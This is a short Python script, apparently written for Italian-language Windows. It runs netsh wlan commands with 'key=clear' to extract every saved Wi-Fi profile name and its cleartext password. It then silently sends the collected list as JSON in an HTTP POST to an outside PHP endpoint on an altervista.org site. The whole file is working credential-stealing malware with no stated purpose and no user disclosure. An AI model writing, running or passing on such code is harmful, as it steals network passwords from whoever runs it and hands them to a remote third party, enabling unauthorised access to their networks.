import subprocess
import re
import requests
import json


code , pr , prs , key  = "cp1252" , "profile" , "profiles" , "Password"

commands = ["netsh", "wlan", "show", prs, pr, None, "key=clear"]

command_output = subprocess.run(commands[0:4], capture_output = True).stdout.decode(code)

profile_names = (re.findall("Tutti i profili utente    : (.*)\r", command_output))

commands.remove(prs)

wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        commands[-2] = name
        profile_info = subprocess.run(commands, capture_output = True).stdout.decode(code)
        if re.search("Chiave di sicurezza      : non presente", profile_info):
            continue
        else:
            wifi_profile["Nome"] = name
            profile_info_pass = subprocess.run(commands, capture_output = True).stdout.decode(code)
            password = re.search("Contenuto chiave            : (.*)\r", profile_info_pass)
            wifi_profile[key] = None if password == None else password[1]    
            wifi_list.append(wifi_profile)

else:
    exit(1)

url = "https://matteolambertucci.altervista.org/wifi/index.php"

wifi = json.dumps(wifi_list)

parameter = { "wifi": wifi }

r = requests.post(url,data=parameter)





